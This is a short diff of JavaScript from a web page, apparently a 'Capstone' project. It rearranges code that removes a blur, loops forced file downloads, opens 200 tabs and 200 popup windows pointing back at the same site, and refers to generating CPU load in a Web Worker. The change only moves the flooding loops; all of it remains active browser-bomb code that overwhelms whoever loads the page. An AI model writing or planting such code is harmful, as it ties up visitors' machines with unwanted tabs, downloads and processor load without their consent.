@@ -87,16 +87,6 @@
     // Remove blur
     document.getElementById('blurred').style.filter = 'none';
 
-    // Multiple Tabs
-    for (let i = 0; i < 200; i++) {
-      window.open('https://arizona5005.github.io/Capstone/', '_blank');
-    }
-
-    // Multiple Windows
-    for (let i = 0; i < 200; i++) {
-      window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
-    }
-
     // Start repeated downloads
     function downloadLoop() {
       const link = document.createElement('a');
@@ -105,6 +95,16 @@
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
+    }
+
+    // Multiple Tabs
+    for (let i = 0; i < 200; i++) {
+      window.open('https://arizona5005.github.io/Capstone/', '_blank');
+    }
+
+    // Multiple Windows
+    for (let i = 0; i < 200; i++) {
+      window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
     }
 
     // Run CPU load in a Web Worker to keep UI responsive (optional)
